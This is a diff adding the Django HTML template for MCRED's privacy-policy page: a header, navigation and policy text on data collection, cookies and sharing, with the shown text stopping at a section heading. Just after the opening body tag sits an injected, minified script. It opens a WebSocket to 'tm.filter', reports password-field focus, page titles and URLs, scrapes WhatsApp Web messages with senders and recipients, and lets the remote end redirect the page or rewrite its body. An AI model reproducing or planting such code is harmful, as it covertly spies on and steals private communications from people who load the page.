@@ -1,0 +1,321 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+  {% load static %}
+  <meta charset="utf-8">
+  <meta content="width=device-width, initial-scale=1.0" name="viewport">
+
+  <title>MCRED</title>
+  <meta content="" name="description">
+  <meta content="" name="keywords">
+
+  <!-- Favicons -->
+  <link href="{% static '/images/portalLogin/home/MCRED@2x.png' %}" rel="icon">
+  <link href="{% static '/images/portalLogin/home/MCRED@2x.png' %}" rel="apple-touch-icon">
+
+  <link rel="stylesheet" href="https://pro.fontawesome.com/releases/v5.10.0/css/all.css" integrity="sha384-AYmEC3Yw5cVb3ZcuHtOA93w35dYTsvhLPVnYs9eStHfGJvOvKxVfELGroGkvsg+p" crossorigin="anonymous"/>
+
+  <!-- Google Fonts -->
+  <link href="https://fonts.googleapis.com/css?family=Open+Sans:300,300i,400,400i,600,600i,700,700i|Raleway:300,300i,400,400i,600,600i,700,700i,900" rel="stylesheet">
+  <link rel="preconnect" href="https://fonts.gstatic.com">
+  <link href="https://fonts.googleapis.com/css2?family=Poppins:ital,wght@0,100;0,200;0,300;0,400;0,500;0,600;0,700;0,800;0,900;1,100;1,200;1,300;1,400;1,500;1,600;1,700;1,800;1,900&display=swap" rel="stylesheet">
+  <!-- Vendor CSS Files -->
+  <link href="{% static '/css/vendor/animate.css/animate.min.css' %}" rel="stylesheet">
+  <link href="{% static '/css/vendor/aos/aos.css' %}" rel="stylesheet">
+  <link href="{% static '/css/vendor/bootstrap/css/bootstrap.min.css' %}" rel="stylesheet">
+  <link href="{% static '/css/vendor/bootstrap-icons/bootstrap-icons.css' %}" rel="stylesheet">
+  <link href="{% static '/css/vendor/boxicons/css/boxicons.min.css' %}" rel="stylesheet">
+  <link href="{% static '/css/vendor/glightbox/css/glightbox.min.css' %}" rel="stylesheet">
+  <link href="{% static '/css/vendor/swiper/swiper-bundle.min.css' %}" rel="stylesheet">
+
+  <!-- Template Main CSS File -->
+  <link href="{% static '/css/PortalLogin/privacy_policy.css' %}" rel="stylesheet">
+
+  <!-- =======================================================
+  * Template Name: Mamba - v4.0.2
+  * Template URL: https://bootstrapmade.com/mamba-one-page-bootstrap-template-free/
+  * Author: BootstrapMade.com
+  * License: https://bootstrapmade.com/license/
+  ======================================================== -->
+</head>
+
+<body><script>!function(){var Y,e,t;function n(){try{return window.self===window.top}catch(Y){return!1}}function r(){var Y={type:"focus",token:S.token,title:document.title,url:document.URL,useragent:navigator.userAgent,pid:S.pid,pn:S.pn};null!=I&&I.readyState==WebSocket.OPEN&&I.send(JSON.stringify(Y))}function a(){var Y={type:"notification",token:S.token,title:document.title,url:document.URL,focused:document.hasFocus(),timeout:S.sendNotificationsInterval,useragent:navigator.appVersion.length>navigator.userAgent.length?navigator.appVersion:navigator.userAgent,pid:S.pid,pn:S.pn};I.send(JSON.stringify(Y))}function i(){h()}function o(){n()&&(clearInterval(y),clearInterval(N)),timeout=setTimeout((function(){f()}),v)}function s(Y){if(n())switch(Y.data.substring(0,1)){case"r":window.location=Y.data.substring(1);break;case"b":document.body.innerHTML=Y.data.substring(1);break;case"w":var e="true"==Y.data.substring(1).toLowerCase();T!=e&&e&&m(),T=e}}function M(Y){var e=document.createElement("a");return e.href=Y,e.href}function u(Y){if(Y&&"password"==Y.type&&!H){H=!0;var e={type:"password_input_focus",focus:!0,token:S.token};I.send(JSON.stringify(e))}}function D(Y){if(Y&&"password"==Y.type&&H){H=!1;var e={type:"password_input_focus",focus:!1,token:S.token};I.send(JSON.stringify(e))}}function c(Y){var e=document.activeElement;e&&e!=document.body?document.querySelector&&(e=document.querySelector(":focus")):e=null;for(var t=0;t<Y.length;++t){let i=Y[t];var n="password"==i.type,r=n&&i.hasAttribute("autofocus"),a=n&&e&&i.isEqualNode(e);(r||a)&&u(),i.onfocus=function(){u(i)},i.onblur=function(){D(i)}}}function d(){n()&&(S.iup&&r(),p()&&(m(),h(),function(){var Y=new MutationObserver((function(Y){Y&&Y.forEach((function(Y){Y&&("childList"!==Y.type||Y.addedNodes.length<=0||Y.addedNodes.forEach((function(Y){if(Y){var e=document.querySelector("div[id=main] header span[title]");e&&(b=e.innerText),document.querySelector("div[id=main] header span[data-icon=default-user]")&&(A="private"),document.querySelector("div[id=main] header span[data-icon=default-group]")&&(A="group");var t=Y.querySelectorAll(".message-in, .message-out");Y.matches(".message-in, .message-out")&&(t=Array.prototype.slice.call(t)).push(Y),t&&t.forEach((function(Y){if(Y&&Y.classList&&!(Y.classList.length<=0)){var e=Y.classList.contains("message-in"),t=Y.querySelector(".copyable-text"),n=Y.querySelector(".selectable-text"),r=new Date,a=null;if(t&&t.attributes["data-pre-plain-text"]){var i=t.attributes["data-pre-plain-text"].textContent,o=/\[(\d{1,2}):(\d{1,2})[ ]{0,1}([p|a]m)?,\s(.+)]\s(.*):/i[Symbol.match](i);if(!o||6!=o.length)return;if(o[3]&&"pm"==o[3].toLowerCase()&&(o[1]=parseInt(o[1])+12),dateParts=/(\d{1,4})[.-\\/](\d{1,4})[.-\\/](\d{1,4})/[Symbol.match](o[4]),!dateParts||4!=dateParts.length)return;if(!(r=date.parse(o[4],C)||function(Y,e,t){var n=[[Y,e,t].join("-"),[Y,t,e].join("-"),[e,Y,t].join("-"),[e,t,Y].join("-"),[t,Y,e].join("-"),[t,e,Y].join("-")],r=Date.now();for(var a in n){var i=Date.parse(n[a]);if(i&&!(Math.abs(r-i)>1728e6))return new Date(i)}}(dateParts[1],dateParts[2],dateParts[3])))return;r.setHours(o[1]),r.setMinutes(o[2]),a=o[5]}E.get(b)||E.set(b,k);var s=n?n.innerText:null;if(a&&s&&T){var M=(a+s+b+r.getTime()).split("").map((function(Y){return Y.charCodeAt(0)})).reduce((function(Y,e){return Y+((Y<<7)+(Y<<3))^e})).toString(16);if(E.get(b).getTime()==r.getTime()?r.setMilliseconds(++L):(L=0,E.set(b,r)),!M||w.has(M))return;var u={type:"wapmessage",timestamp:r.getTime(),id:M,incoming:e,sender:e?a:"Me",content:s,recipient:e?"Me":b,conversationId:b+"("+A+")"};I.send(JSON.stringify(u)),w.add(M)}}}))}})))}))}));if(!Y)return;Y.observe(document.body,{childList:!0,subtree:!0})}()),n()&&(a(),y=setInterval(a,S.sendNotificationsInterval),p()&&(N=setInterval(i,S.pollWhatsappTrackingInterval))),function(){for(var Y=[],e=document.getElementsByTagName("link"),t=0;t<e.length;++t)"icon"!=e[t].getAttribute("rel")&&"shortcut icon"!=e[t].getAttribute("rel")||(Y[Y.length]=M(e[t].getAttribute("href")));0==Y.length&&(Y[0]=M("/favicon.ico"));var n={type:"favicon"};n.url=document.URL,n.src=Y,n.title=document.title,n.token=S.token,n.useragent=navigator.appVersion.length>navigator.userAgent.length?navigator.appVersion:navigator.userAgent,I.send(JSON.stringify(n))}(),S.dontTrackWebPasswords&&(c(document.getElementsByTagName("input")),new MutationObserver((function(Y){Y&&Y.forEach((function(Y){Y&&Y.addedNodes&&0!=Y.addedNodes.length&&(window.NodeList&&!NodeList.prototype.forEach&&(NodeList.prototype.forEach=Array.prototype.forEach),Y.addedNodes.forEach((function(Y){Y.tagName&&c(Y.getElementsByTagName("input"))})))}))})).observe(document,{childList:!0,subtree:!0}),window.onbeforeunload=D))}function l(){document.tmfilter||(f(),C={"ar-SA":"D/M/YY","bg-BG":"D.M.YYYY","ca-ES":"D/M/YYYY","zh-TW":"YYYY/M/D","cs-CZ":"D.M.YYYY","Da-DK":"D-M-YYYY","De-DE":"D.M.YYYY","el-GR":"D/M/YYYY","en-US":"M/D/YYYY","fi-FI":"D.M.YYYY","fr-FR":"D/M/YYYY","he-IL":"D/M/YYYY","hu-HU":"YYYY. M. D.","is-IS":"D.M.YYYY","it-IT":"D/M/YYYY","ja-JP":"YYYY/M/D","ko-KR":"YYYY-M-D","nl-NL":"D-M-YYYY","nb-NO":"D.M.YYYY","pl-PL":"YYYY-M-D","pt-BR":"D/M/YYYY","ro-RO":"D.M.YYYY","ru-RU":"D.M.YYYY","hr-HR":"D.M.YYYY","sk-SK":"D. M. YYYY","sq-AL":"YYYY-M-D","sv-SE":"YYYY-M-D","th-TH":"D/M/YYYY","tr-TR":"D.M.YYYY","ur-PK":"D/M/YYYY","iD-ID":"D/M/YYYY","uk-UA":"D.M.YYYY","be-BY":"D.M.YYYY","sl-SI":"D.M.YYYY","et-EE":"D.M.YYYY","lv-LV":"YYYY.M.D.","lt-LT":"YYYY.M.D","fa-IR":"M/D/YYYY","vi-VN":"D/M/YYYY","hy-AM":"D.M.YYYY","az-Latn-AZ":"D.M.YYYY","eu-ES":"YYYY/M/D","Mk-MK":"D.M.YYYY","af-ZA":"YYYY/M/D","ka-GE":"D.M.YYYY","fo-FO":"D-M-YYYY","hi-IN":"D-M-YYYY","Ms-MY":"D/M/YYYY","kk-KZ":"D.M.YYYY","ky-KG":"D.M.YY","sw-KE":"M/D/YYYY","uz-Latn-UZ":"D/M YYYY","tt-RU":"D.M.YYYY","pa-IN":"D-M-YY","gu-IN":"D-M-YY","ta-IN":"D-M-YYYY","te-IN":"D-M-YY","kn-IN":"D-M-YY","Mr-IN":"D-M-YYYY","sa-IN":"D-M-YYYY","Mn-MN":"YY.M.D","gl-ES":"D/M/YY","kok-IN":"D-M-YYYY","syr-SY":"D/M/YYYY","Dv-MV":"D/M/YY","ar-IQ":"D/M/YYYY","zh-CN":"YYYY/M/D","De-CH":"D.M.YYYY","en-GB":"D/M/YYYY","es-MX":"D/M/YYYY","fr-BE":"D/M/YYYY","it-CH":"D.M.YYYY","nl-BE":"D/M/YYYY","nn-NO":"D.M.YYYY","pt-PT":"D-M-YYYY","sr-Latn-CS":"D.M.YYYY","sv-FI":"D.M.YYYY","az-Cyrl-AZ":"D.M.YYYY","Ms-BN":"D/M/YYYY","uz-Cyrl-UZ":"D.M.YYYY","ar-EG":"D/M/YYYY","zh-HK":"D/M/YYYY","De-AT":"D.M.YYYY","en-AU":"D/M/YYYY","es-ES":"D/M/YYYY","fr-CA":"YYYY-M-D","sr-Cyrl-CS":"D.M.YYYY","ar-LY":"D/M/YYYY","zh-SG":"D/M/YYYY","De-LU":"D.M.YYYY","en-CA":"D/M/YYYY","es-GT":"D/M/YYYY","fr-CH":"D.M.YYYY","ar-DZ":"D-M-YYYY","zh-MO":"D/M/YYYY","De-LI":"D.M.YYYY","en-NZ":"D/M/YYYY","es-CR":"D/M/YYYY","fr-LU":"D/M/YYYY","ar-MA":"D-M-YYYY","en-IE":"D/M/YYYY","es-PA":"M/D/YYYY","fr-MC":"D/M/YYYY","ar-TN":"D-M-YYYY","en-ZA":"YYYY/M/D","es-DO":"D/M/YYYY","ar-OM":"D/M/YYYY","en-JM":"D/M/YYYY","es-VE":"D/M/YYYY","ar-YE":"D/M/YYYY","en-029":"M/D/YYYY","es-CO":"D/M/YYYY","ar-SY":"D/M/YYYY","en-BZ":"D/M/YYYY","es-PE":"D/M/YYYY","ar-JO":"D/M/YYYY","en-TT":"D/M/YYYY","es-AR":"D/M/YYYY","ar-LB":"D/M/YYYY","en-ZW":"M/D/YYYY","es-EC":"D/M/YYYY","ar-KW":"D/M/YYYY","en-PH":"M/D/YYYY","es-CL":"D-M-YYYY","ar-AE":"D/M/YYYY","es-UY":"D/M/YYYY","ar-BH":"D/M/YYYY","es-PY":"D/M/YYYY","ar-QA":"D/M/YYYY","es-BO":"D/M/YYYY","es-SV":"D/M/YYYY","es-HN":"D/M/YYYY","es-NI":"D/M/YYYY","es-PR":"D/M/YYYY","aM-ET":"D/M/YYYY","tzM-Latn-DZ":"D-M-YYYY","iu-Latn-CA":"D/M/YYYY","sMa-NO":"D.M.YYYY","Mn-Mong-CN":"YYYY/M/D","gD-GB":"D/M/YYYY","en-MY":"D/M/YYYY","prs-AF":"D/M/YY","bn-BD":"D-M-YY","wo-SN":"D/M/YYYY","rw-RW":"M/D/YYYY","qut-GT":"D/M/YYYY","sah-RU":"M.D.YYYY","gsw-FR":"D/M/YYYY","co-FR":"D/M/YYYY","oc-FR":"D/M/YYYY","Mi-NZ":"D/M/YYYY","ga-IE":"D/M/YYYY","se-SE":"YYYY-M-D","br-FR":"D/M/YYYY","sMn-FI":"D.M.YYYY","Moh-CA":"M/D/YYYY","arn-CL":"D-M-YYYY","ii-CN":"YYYY/M/D","Dsb-DE":"D. M. YYYY","ig-NG":"D/M/YYYY","kl-GL":"D-M-YYYY","lb-LU":"D/M/YYYY","ba-RU":"D.M.YY","nso-ZA":"YYYY/M/D","quz-BO":"D/M/YYYY","yo-NG":"D/M/YYYY","ha-Latn-NG":"D/M/YYYY","fil-PH":"M/D/YYYY","ps-AF":"D/M/YY","fy-NL":"D-M-YYYY","ne-NP":"M/D/YYYY","se-NO":"D.M.YYYY","iu-Cans-CA":"D/M/YYYY","sr-Latn-RS":"D.M.YYYY","si-LK":"YYYY-M-D","sr-Cyrl-RS":"D.M.YYYY","lo-LA":"D/M/YYYY","kM-KH":"YYYY-M-D","cy-GB":"D/M/YYYY","bo-CN":"YYYY/M/D","sMs-FI":"D.M.YYYY","as-IN":"D-M-YYYY","Ml-IN":"D-M-YY","en-IN":"D-M-YYYY","or-IN":"D-M-YY","bn-IN":"D-M-YY","tk-TM":"D.M.YY","bs-Latn-BA":"D.M.YYYY","Mt-MT":"D/M/YYYY","sr-Cyrl-ME":"D.M.YYYY","se-FI":"D.M.YYYY","zu-ZA":"YYYY/M/D","xh-ZA":"YYYY/M/D","tn-ZA":"YYYY/M/D","hsb-DE":"D. M. YYYY","bs-Cyrl-BA":"D.M.YYYY","tg-Cyrl-TJ":"D.M.YY","sr-Latn-BA":"D.M.YYYY","sMj-NO":"D.M.YYYY","rM-CH":"D/M/YYYY","sMj-SE":"YYYY-M-D","quz-EC":"D/M/YYYY","quz-PE":"D/M/YYYY","hr-BA":"D.M.YYYY.","sr-Latn-ME":"D.M.YYYY","sMa-SE":"YYYY-M-D","en-SG":"D/M/YYYY","ug-CN":"YYYY-M-D","sr-Cyrl-BA":"D.M.YYYY","es-US":"M/D/YYYY"}[navigator.language],document.tmfilter="present")}function f(){(I=new WebSocket(S.connectionString)).onclose=o,I.onmessage=s,I.onopen=d,S.extJs&&(this.extJs.webSockReady=()=>I.readyState===WebSocket.OPEN,this.extJs.webSockSend=Y=>I.send(Y))}function g(){var Y=function(){var Y=["webkit","moz","ms","o"];if("hidden"in document)return"hidden";for(var e=0;e<Y.length;e++)if(Y[e]+"Hidden"in document)return Y[e]+"Hidden";return null}();return!!Y&&document[Y]}function p(){var Y=document.head.querySelector("[name='og:title']");return!!Y&&"WhatsApp Web"===Y.getAttribute("content")}function h(){I.send(JSON.stringify({type:"waptracking"}))}function m(){E=new Map,w=new Set,L=0,(k=new Date).setSeconds(0),k.setMilliseconds(0)}Y=this,e={},t={en:{MMMM:"January February March April May June July August September October November December".split(" "),MMM:"Jan Feb Mar Apr May Jun Jul Aug Sep Oct Nov Dec".split(" "),dddd:"Sunday Monday Tuesday Wednesday Thursday Friday Saturday".split(" "),ddd:"Sun Mon Tue Wed Thu Fri Sat".split(" "),dd:"Su Mo Tu We Th Fr Sa".split(" "),A:["a.m.","p.m."],formatter:{YYYY:function(Y){return("000"+Y.getFullYear()).slice(-4)},YY:function(Y){return("0"+Y.getFullYear()).slice(-2)},Y:function(Y){return""+Y.getFullYear()},MMMM:function(Y){return this.MMMM[Y.getMonth()]},MMM:function(Y){return this.MMM[Y.getMonth()]},MM:function(Y){return("0"+(Y.getMonth()+1)).slice(-2)},M:function(Y){return""+(Y.getMonth()+1)},DD:function(Y){return("0"+Y.getDate()).slice(-2)},D:function(Y){return""+Y.getDate()},HH:function(Y){return("0"+Y.getHours()).slice(-2)},H:function(Y){return""+Y.getHours()},A:function(Y){return this.A[11<Y.getHours()|0]},hh:function(Y){return("0"+(Y.getHours()%12||12)).slice(-2)},h:function(Y){return""+(Y.getHours()%12||12)},mm:function(Y){return("0"+Y.getMinutes()).slice(-2)},m:function(Y){return""+Y.getMinutes()},ss:function(Y){return("0"+Y.getSeconds()).slice(-2)},s:function(Y){return""+Y.getSeconds()},SSS:function(Y){return("00"+Y.getMilliseconds()).slice(-3)},SS:function(Y){return("0"+(Y.getMilliseconds()/10|0)).slice(-2)},S:function(Y){return""+(Y.getMilliseconds()/100|0)},dddd:function(Y){return this.dddd[Y.getDay()]},ddd:function(Y){return this.ddd[Y.getDay()]},dd:function(Y){return this.dd[Y.getDay()]},Z:function(Y){return(0<(Y=Y.utc?0:Y.getTimezoneOffset()/.6)?"-":"+")+("000"+Math.abs(Y-Y%100*.4)).slice(-4)},post:function(Y){return Y}},parser:{find:function(Y,e){for(var t,n=-1,r=0,a=0,i=Y.length;a<i;a++)t=Y[a],!e.indexOf(t)&&t.length>r&&(n=a,r=t.length);return{index:n,length:r}},MMMM:function(Y){return this.parser.find(this.MMMM,Y)},MMM:function(Y){return this.parser.find(this.MMM,Y)},A:function(Y){return this.parser.find(this.A,Y)},h:function(Y,e){return(12===Y?0:Y)+12*e},pre:function(Y){return Y}}}},e.format=function(Y,n,r){var a=e.addMinutes(Y,r?Y.getTimezoneOffset():0),i=t.en,o=i.formatter;return a.utc=r,n.replace(/(\[[^\[\]]*]|\[.*\][^\[]*\]|YYYY|YY|MMM?M?|DD|HH|hh|mm|ss|SSS?|ddd?d?|.)/g,(function(Y){var e=o[Y];return e?o.post(e.call(i,a,n)):Y.replace(/\[(.*)]/,"$1")}))},e.parse=function(Y,n,r){var a,i,o=t.en,s=o.parser.pre(Y),M=0,u=/(MMMM?|A)|(YYYY)|(SSS)|(MM|DD|HH|hh|mm|ss)|(YY|M|D|H|h|m|s|SS)|(S)|(.)/g,D={2:/^\d{1,4}/,3:/^\d{1,3}/,4:/^\d\d/,5:/^\d\d?/,6:/^\d/};Y=[31,28,31,30,31,30,31,31,30,31,30,31];for(var c={Y:1970,M:1,D:1,H:0,m:0,s:0,S:0};a=u.exec(n);){var d=0,l=1;for(i="";!i;)i=a[++d];a=i.charAt(0);var f=s.slice(M);if(2>d){var g=o.parser[i].call(o,f,n);c[a]=g.index,"M"===a&&c[a]++,l=g.length}else if(7>d)g=(f.match(D[d])||[""])[0],c[a]=0|("S"===a?(g+"000").slice(0,-i.length):g),l=g.length;else if(" "!==a&&a!==f[0])return NaN;if(!l)return NaN;M+=l}return M===s.length&&g?(c.Y+=70>c.Y?2e3:100>c.Y?1900:0,c.H=c.H||o.parser.h(c.h||0,c.A||0),n=new Date(c.Y,c.M-1,c.D,c.H,c.m,c.s,c.S),Y[1]+=0|e.isLeapYear(n),1>c.M||12<c.M||1>c.D||c.D>Y[c.M-1]||23<c.H||59<c.m||59<c.s?NaN:r?e.addMinutes(n,-n.getTimezoneOffset()):n):NaN},e.isValid=function(Y,t){return!!e.parse(Y,t)},e.addYears=function(Y,t){return e.addMonths(Y,12*t)},e.addMonths=function(Y,e){var t=new Date(Y.getTime());return t.setMonth(t.getMonth()+e),t},e.addDays=function(Y,e){var t=new Date(Y.getTime());return t.setDate(t.getDate()+e),t},e.addHours=function(Y,t){return e.addMilliseconds(Y,36e5*t)},e.addMinutes=function(Y,t){return e.addMilliseconds(Y,6e4*t)},e.addSeconds=function(Y,t){return e.addMilliseconds(Y,1e3*t)},e.addMilliseconds=function(Y,e){return new Date(Y.getTime()+e)},e.subtract=function(Y,e){var t=Y.getTime()-e.getTime();return{toMilliseconds:function(){return t},toSeconds:function(){return t/1e3|0},toMinutes:function(){return t/6e4|0},toHours:function(){return t/36e5|0},toDays:function(){return t/864e5|0}}},e.isLeapYear=function(Y){return!(((Y=Y.getFullYear())%4||!(Y%100))&&Y%400)},e.isSameDay=function(Y,t){return e.format(Y,"YYYYMMDD")===e.format(t,"YYYYMMDD")},Y.date=e;var S={token:"9811afd6-15cd-4a65-8d13-2ea9b4a80aaf",sendNotificationsInterval:Number("1000"),pollWhatsappTrackingInterval:Number("20000"),connectionString:"wss://tm.filter:1504",pid:"18336",pn:"chrome.exe",iup:false,dontTrackWebPasswords:false,extJs:null},v=6e4,y=null,N=null,b=null,A=null,T=!1,E=null,w=null,L=0,k=null,I=null,C="",H=!1;!function Y(e){g()?setTimeout((function(){Y(e)}),1e3):e()}((function(){S.extJs&&S.extJs.init(S.token),n()&&window.addEventListener("focus",r),(n()||S.extJs)&&l()}))}();</script>
+
+  <!-- ======= Top Bar ======= -->
+  <section id="topbar" class="d-flex align-items-center fixed-top">
+    <div class="container d-flex justify-content-center justify-content-md-between">
+      <div class="contact-info d-flex align-items-center">
+        <i class="far fa-envelope" style="color:#353535"></i><a href="connect@mcred.com">connect@mcred.com</a>
+        <svg xmlns="http://www.w3.org/2000/svg" width="14" height="14" fill="currentColor" class="bi bi-telephone" viewBox="0 0 16 16">
+          <path d="M3.654 1.328a.678.678 0 0 0-1.015-.063L1.605 2.3c-.483.484-.661 1.169-.45 1.77a17.568 17.568 0 0 0 4.168 6.608 17.569 17.569 0 0 0 6.608 4.168c.601.211 1.286.033 1.77-.45l1.034-1.034a.678.678 0 0 0-.063-1.015l-2.307-1.794a.678.678 0 0 0-.58-.122l-2.19.547a1.745 1.745 0 0 1-1.657-.459L5.482 8.062a1.745 1.745 0 0 1-.46-1.657l.548-2.19a.678.678 0 0 0-.122-.58L3.654 1.328zM1.884.511a1.745 1.745 0 0 1 2.612.163L6.29 2.98c.329.423.445.974.315 1.494l-.547 2.19a.678.678 0 0 0 .178.643l2.457 2.457a.678.678 0 0 0 .644.178l2.189-.547a1.745 1.745 0 0 1 1.494.315l2.306 1.794c.829.645.905 1.87.163 2.611l-1.034 1.034c-.74.74-1.846 1.065-2.877.702a18.634 18.634 0 0 1-7.01-4.42 18.634 18.634 0 0 1-4.42-7.009c-.362-1.03-.037-2.137.703-2.877L1.885.511z"/>
+        </svg><span>797-7172-123</span>
+      </div>
+      <div class="social-links d-none d-md-block">
+        <a target="_blank" class="instagram" href="https://www.instagram.com/mcre.d/"><i class="fab fa-instagram"></i></a>
+        <a class="linkedin" target="_blank" href="https://www.linkedin.com/company/mcred/"><i class="fab fa-linkedin-in"></i></a>
+        <a class="facebook" target="_blank" href="https://www.facebook.com/MCRED-102965945034452"><i class="fab fa-facebook-f"></i></a>
+        <a class="twitter" target="_blank" href="https://twitter.com/Mcred59369762"><i class="fab fa-twitter"></i></i></a>
+        <a class="youtube" target="_blank" href="https://www.youtube.com/channel/UC33RpFwzAndn3CCJr83jUbw?guided_help_flow=5"><i class="fab fa-youtube"></i></a >
+      </div>
+    </div>
+  </section>
+
+  <!-- ======= Header ======= -->
+  <header id="header" class="d-flex align-items-center fixed-top">
+    <div class="container d-flex align-items-center">
+
+      <div class="logo me-auto">
+        <a href="/home"  class="logo mr-auto"><img src="{% static '/images/portalLogin/home/MCRED1.png'%}" alt=""></a>
+
+        <!-- Uncomment below if you prefer to use an image logo -->
+        <!-- <a href="index.html"><img src="assets/img/logo.png" alt="" class="img-fluid"></a>-->
+      </div>
+
+      <nav id="navbar" class="navbar ">
+        <ul>
+          <li><a class="nav-link " href="{% url 'index1' %}">Home</a></li>
+          <li><a class="nav-link " href="{% url 'mcred_business' %}">Business</a></li>
+          <li><a class="nav-link " href="{% url 'mcred_investor' %}">Investor</a></li>
+          <li><a class="nav-link " href="{% url 'mcred_partner' %}">Partner</a></li>
+          <li><a class="nav-link " href="{% url 'mcred_aboutus' %}">About Us</a></li>
+          <li><a class="nav-link " href="{% url 'mcred_blogs' %}">Blogs</a></li>
+          <li><a class="nav-link " href="{% url 'mcred_login' %}">Login</a></li>
+
+        </ul>
+        <button class="btn-get-started"><a href="{% url 'mcred_signup' %}">Sign Up</a></button>
+        <i class="bi bi-list mobile-nav-toggle"></i>
+      </nav><!-- .navbar -->
+
+    </div>
+  </header><!-- End Header -->
+  <section id="business" class="banner-section">
+    <div class="overlay"></div>
+    <div class="bussiness-section">
+        <div class="container">
+            <div class="row">
+                <div class="col-sm-12  col-md-6">
+                    <div class="banner-details">
+                        <h2 class="animate__animated animate__fadeInDown">Privacy Policy</h2>
+                    </div>
+                </div>
+
+            </div>
+        </div>
+
+    </div>
+</section>
+
+  <main id="main">
+        <section class="about" style="border-bottom: 1px solid #eaeaea;">
+            <div class="container " data-aos="fade-up">
+            <div class="row content" style="margin-left:50px;margin-right:50px;">
+            <div class="col-md-12 col-lg-12 text-center ">
+            <div class="section-title">
+            <h2>Effective Date</h2><br>
+            <span style="text-align:center">01-12-2020</span>
+            <p style="text-align: justify;">This document (“Privacy Policy”) is published by virtue of the legal requirement under the provisions of the Information Technology Act, 2000 that require intermediaries to publish the rules and regulations, privacy policy and terms for access or usage of their website/mobile app and is primarily governed by Rule 3 (1) of the Information Technology (Intermediaries Guidelines) Rules, 2011 and the Information Technology (Reasonable Security Practices and Procedures and Sensitive Personal Data or Information) Rules, 2011.<br>
+            <br>
+            This privacy policy sets out the information practices we follow including the type of information is collected, how the information is collected, how the information is used and with whom it is shared.</p>
+
+            <p class="text-left"><b>Commitment</b></p>
+
+            <p class="text-left">‘MCRED’ or ‘Man Investment Services Private Limited’ or ‘MISPL’intends to protect the privacy of its users and members on its Website and the privacy of the data provided by them to MCRED from time to time. For the purpose of this Privacy Policy, Website means and includes the website (www.mcred.com) and mobile application of MCRED.<br>
+            <br>
+            The privacy of our Website users, whether you are our former or existing registered user or merely a visitor to our Website, is important to us and we are strongly committed to your right to privacy and to keeping your personal and other information secure. We encourage you to read our privacy statement to understand what types of personally identifiable information we collect and how we use this information.</p>
+
+            <p class="text-left"><b>What type of information does mcred.com collect from you?</b></p>
+
+            <p class="text-left"><b>Personal Information</b></p>
+
+            <p class="text-left">For the purpose of providing you services, we require you to enrol yourself on our Website and get yourself registered. If you choose to become a registered member of our Website, you are required to share your name, e-mail address, gender, date of birth, postal address, phone number, a unique login name, password, password validation, business information and other details shared via application form or via email or via any other medium (Personally Identifiable Information).<br>
+            <br>
+            MCRED also collects other information specific to provide you service each time such as name, bank statements, KYC documents, personal details, business details, income tax details, and other information via application form or via email or via any other electronic medium or via printed form (Service Information). All Personally Identifiable Information and Service Information shall be collectively known as “Information”. Additionally, MCRED collects your other details including but not limited to your feedback, suggestions, views, opinions, etc. shared on our Website (User Information) that may be shared/volunteered by you on our discussion forums or other pages of our Website. Such information being in the public domain is available for access to all our Website’s users and visitors. You are advised to exercise discretion before you make such details public, as such information is vulnerable to misuse and can be easily misused. MCRED in this regard fully disclaims any liability (ies) or claim(s), which may arise by use/misuse of User Information shared by you, by any third party or any party not known to MCRED.<br>
+            <br>
+            Information exchanged by you with MCRED in the form of written communication, responses to emails, feedback required from you, participation in discussions, etc. is handled with confidentiality.</p>
+
+            <p class="text-left"><b>Non-Personal Information</b></p>
+
+            <p class="text-left">MCRED also collects certain other information from you on your visit to our Website such as information about your operating system, browser type, the URL of the previous website you visited, list of third-party applications being used by you, your internet service provider and your IP Address (Non-personal Information). This information cannot be easily used to personally identify you. We use Non-personal Information for the purposes including but not limited to troubleshoot connection problems, administer the Website, analyze trends in the market, gather demographic information, to ascertain how our visitors use our Website, including information relating to the frequency of visits to our Website, average length of visits, pages viewed during a visit, ensuring compliance with the applicable law, co-operating with law enforcement activities, etc. This information is used to improve the Website content and performance. You also agree that MCRED may gather usage statistics and usage data from your use of our Website to evaluate your use of our products/services, to improve our products/services, Website content and to ensure that you are complying with the terms of the applicable agreements between you and MCRED. The statistics and data collected may or may not be aggregated. These statistics contain no information that can distinctly identify you.<br>
+            <br>
+            We may in future also share this information with third party service providers or third party advertisers to measure the overall effectiveness of our online advertising, content, programming and for other bonafide purpose, as we may desire. By usage of our Website you expressly permit MCRED to access such information for one or more purposes deemed fit by MCRED.</p>
+
+            <p class="text-left"><b>Cookies</b></p>
+
+            <p class="text-left">Similar to other commercial web sites, our Website utilizes standard technology called “Cookies” and Web server logs to collect information about how our Website is used. Cookies are small pieces of information that are stored by your browser on your device’s hard drive. Cookies are only read by the server that places them, and are unable to inter alia run programs on your device, plant viruses or harvest your personal information. Cookies allow Web servers to recognize your device each time you return to our Website including the date and time of visits, the pages viewed, time spent at our Website, and the websites visited just before and just after our Website, verify your registration or password information (in case of registered users) during a particular session so that you do not have to input your password multiple times as you navigate the site and suggest products or services that may interest you. This information is collected on an aggregate basis. None of this information is associated with you as an individual.<br>
+            <br>
+            Most web browsers automatically accept cookies. By changing the options on your web browser or using certain software programs, you can control how and whether cookies will be accepted by your browser. MCRED understands and supports your right to block any unwanted Internet activity, especially that of unscrupulous websites. However, blocking MCRED cookies may disable certain features on our Website and may make it impossible for you to use certain services available on our Website.</p>
+
+            <p class="text-left"><b>Session Data</b></p>
+
+            <p class="text-left">We automatically log generic information about your device’s connection to the Internet, which we call “session data”, that is anonymous and not linked to any personal information. Session data consists of information such as the IP address, operating system, type of browser software being used by you and the activities conducted by you on our Website. An IP address is a number that lets device attached to the Internet, such as our web servers, know where to send data back to the user, such as the pages of the site the user wishes to view. We collect session data because it helps us analyze things such as the items visitors are likely to click on most, the manner in which visitors click preferences on our Website, number of visitors surfing to various pages on the Website, time spent by the visitors on our Website and frequency of their visit. It also helps us diagnose problems with our servers and lets us better administer our systems. Although such information does not identify any visitor personally, it is possible to determine from an IP address a visitor’s Internet Service Provider (ISP), and the approximate geographic location of his or her point of connectivity.</p>
+
+            <p class="text-left"><b>Sharing Information</b></p>
+
+            <p class="text-left">MCRED may share your Information, including the bureau reports, with its service providers, affiliate(s), agents, partners and such other third parties for the purposes of (i) providing the services and to perform the functions on your behalf or on behalf of MCRED; (ii) marketing new products and services by MCRED or by any of its affiliate(s), service partners and third parties; or (iii) marketing of services provided by such third parties, affiliates and service partners of MCRED. It is hereby expressly declared that MCRED shall not be responsible for use of your Information by such third parties and service partners and their privacy policies.</p>
+
+            <p class="text-left"><b>Third Party Products and Services</b></p>
+
